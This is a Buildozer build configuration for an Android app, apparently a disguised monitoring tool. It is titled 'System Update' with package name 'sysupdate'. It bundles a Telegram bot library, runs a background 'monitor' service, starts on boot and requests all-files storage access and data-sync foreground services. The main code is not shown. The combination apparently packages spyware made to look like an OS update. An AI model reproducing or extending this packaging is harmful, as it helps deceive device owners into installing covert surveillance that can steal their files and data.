[app]

# (str) Title of your application
title = System Update

# (str) Package name
package.name = sysupdate

# (str) Package domain
package.domain = org.vajra.pro

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning
version = 2.1

# (list) Application requirements
# Naye Android versions ke liye specific versions zaroori hain
requirements = python3==3.11.1,kivy==2.3.0,pyTelegramBotAPI,requests,android,certifi,chardet,idna,urllib3

# (str) Custom source folders for requirements
# Isse compilation ke errors kam honge
p4a.branch = master

# (list) Supported orientations
orientation = portrait

# (list) List of service to declare
# Background mein kaam karne ke liye
services = monitor:main.py

#
# Android specific
#

# (bool) Fullscreen or not
fullscreen = 0

# (list) Permissions 
# Android 14+ ke liye FOREGROUND_SERVICE_SPECIAL_USE aur DATA_SYNC dono zaroori hain
android.permissions = INTERNET, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_SPECIAL_USE

# (int) Target Android API (API 34 = Android 14+)
android.api = 34

# (int) Minimum API (Android 7.0+)
android.minapi = 24

# (int) Android SDK version to use
android.sdk = 34

# (str) Android NDK version to use
android.ndk = 25b

# (bool) Use --private data storage (True)
android.private_storage = True

# (bool) If True, then automatically accept SDK license
android.accept_sdk_license = True

# (str) The Android archs to build for
# Modern devices ke liye dono 64 aur 32 bit architecture
android.archs = arm64-v8a, armeabi-v7a

# (bool) enables Android auto backup feature
android.allow_backup = True

# (str) The format used to package the app
android.debug_artifact = apk

# (list) List of Java .jar files to add
android.meta_data = com.google.android.gms.permission.AD_ID=false

[buildozer]

# (int) Log level (2 = debug info)
log_level = 2

# (int) Display warning if buildozer is run as root
warn_on_root = 0
